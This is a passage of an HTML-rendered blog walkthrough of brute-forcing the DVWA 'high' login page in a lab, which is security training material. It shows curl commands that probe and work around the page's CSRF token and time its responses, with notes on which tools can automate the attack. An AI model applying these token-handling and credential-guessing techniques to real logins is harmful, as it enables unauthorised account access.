&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Username and/or password incorrect.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;The page loads as normal. But what happens if we repeat the last request, re-using the same CSRF token (which now would be invalid)? Are we able to-do a similar trick as we did in the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;main login screen&lt;/a&gt;, where we get a valid session and then kept using it over and over?&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !curl&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;The page did not respond the same! Let's dig deeper...&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie &amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=${user_token}&amp;amp;Login=Login&amp;quot; -i&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Moved Temporarily
&lt;/span&gt;&lt;span class="line"&gt;Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;0, pre-check&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;Pragma: no-cache
&lt;/span&gt;&lt;span class="line"&gt;Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8
&lt;/span&gt;&lt;span class="line"&gt;Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; 08:52:00 GMT
&lt;/span&gt;&lt;span class="line"&gt;Location: index.php
&lt;/span&gt;&lt;span class="line"&gt;Server: Microsoft-IIS/8.0
&lt;/span&gt;&lt;span class="line"&gt;X-Powered-By: PHP/5.6.0
&lt;/span&gt;&lt;span class="line"&gt;Date: Fri, &lt;span class="m"&gt;06&lt;/span&gt; Nov &lt;span class="m"&gt;2015&lt;/span&gt; 15:58:12 GMT
&lt;/span&gt;&lt;span class="line"&gt;Content-Length: 132
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;Just &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;like before&lt;/a&gt;, we are being redirected after submitting, however this time it only happens when the CSRF token is incorrect - not the credentials. Something to keep in mind, would the page we are being redirected to different depending if the login was successful? Now, let's follow the redirect and see what is returned.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !curl -L | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p' | html2text&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Comparing CSRF tokens" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-05.png" /&gt;&lt;/p&gt;

&lt;p&gt;See how we get the message three times? So we are able to send multiple requests, but only show the results when the CSRF token is valid.&lt;/p&gt;

&lt;p&gt;We are going to cheat a little here, and see what happens when we make a successful login, and compare it to an invalid one, both with an invalid CSRF token. If there are any differences (e.g. where we are being redirected to, page size, cookies etc.), is the web application checking the credentials even if the CSRF is invalid? If it is, we might be able to use this as a marker to bypass the CSRF function.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie &amp;quot;192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=123&amp;amp;Login=Login&amp;quot; -i -L &amp;gt;invalid.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie &amp;quot;192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=password&amp;amp;user_token=123&amp;amp;Login=Login&amp;quot; -i -L &amp;gt;valid.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff {in,}valid.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;90c90
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;       &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'4e9d8137848eca76c183f5ab86ef8471'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;       &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'d6d50d4fd2ac26487996984f8ac2ece1'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Comparing requests" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-06.png" /&gt;&lt;/p&gt;

&lt;p&gt;Nope. Sending valid credentials does not make a difference (same redirected page, same length, same cookie). Nothing to use as a marker (unlike the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;login screen&lt;/a&gt; ). This means the web application is processing the CSRF token and does not proceed any further.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Invalid token request&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;Is there a way to somehow bypass the CSRF check? We already know what happens if we do not send the correct value in the CSRF token, but what happens if the token is blank, if the token field is missing, if the token value contains characters out of its normal range (&lt;code&gt;0-f&lt;/code&gt;), or, if the token value is too short/long?&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=123&amp;amp;Login=Login' -L \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;'/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; html2text
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=&amp;amp;Login=Login' -L \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;'/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; html2text
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=%20&amp;amp;Login=Login' -L \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;'/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; html2text
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login' -L \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;   &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;'/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; html2text
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;CSRF token is incorrect
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Comparing requests" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-07.png" /&gt;&lt;/p&gt;

&lt;p&gt;All failed.&lt;/p&gt;

&lt;p&gt;The only other way to try and bypass this protection would be to predict the value. Is the "seed" (the method used to generate the token) weak? Example, what if it was only the timestamp in a MD5? However, I am going to skip doing this, because I know it is a dead end in this case.&lt;/p&gt;

&lt;p&gt;All of this means we need to include a unique value in each request during the brute force attack, so we &lt;strong&gt;make a GET request before sending the login credentials&lt;/strong&gt; in another GET request. This in itself &lt;strong&gt;will limit what tools we can use&lt;/strong&gt; (e.g. Hydra v8.1 does not support this - only solution would be to use a Proxy and have it alter Hydra's requests). Plus, due to the nature of the web application being slightly different (e.g. &lt;strong&gt;having to be already authenticated&lt;/strong&gt; at the screen we want to brute force), this is going to make it &lt;strong&gt;even more difficult&lt;/strong&gt;. Example, the version of Patator we have been using (v0.5) does not support this, however v0.7 does! Having to be logged into the web application, means we have to use a fixed session value (&lt;code&gt;PHPSESSID&lt;/code&gt;), which will mean we only have one &lt;code&gt;user_token&lt;/code&gt; at a time. Using multiple threads, will make multiple GET requests to get a &lt;code&gt;user_token&lt;/code&gt; and each request resets the value, thus making the last request the only valid value (so some request would never be valid, even with the correct login details). Single thread attack, once again.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Timings"&gt;&lt;/a&gt;
&lt;h3&gt;Timings&lt;/h3&gt;

&lt;p&gt;When doing our CSRF checks, we noticed that the web application response time was not always the same (unlike &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;Medium&lt;/a&gt; where it would always take an extra 3 seconds).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# for x in {1..3}; do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nb"&gt;time &lt;/span&gt;curl -s -b &lt;span class="s1"&gt;'security=low'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;Login=Login'&lt;/span&gt; &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=low'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 12% cpu 0.064 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=low'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.00s user 0.00s system 19% cpu 0.040 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=low'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 15% cpu 0.052 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# for x in {1..10}; do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;user_token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie &lt;span class="s1"&gt;'192.168.1.44/DVWA/vulnerabilities/brute/'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nb"&gt;time &lt;/span&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=${user_token}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &amp;gt; /dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 0% cpu 2.055 total
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b &lt;span class="s1"&gt;'security=high'&lt;/span&gt; -b dvwa.cookie  &amp;gt; /dev/null  0.01s user 0.00s system 18% cpu 0.043 total
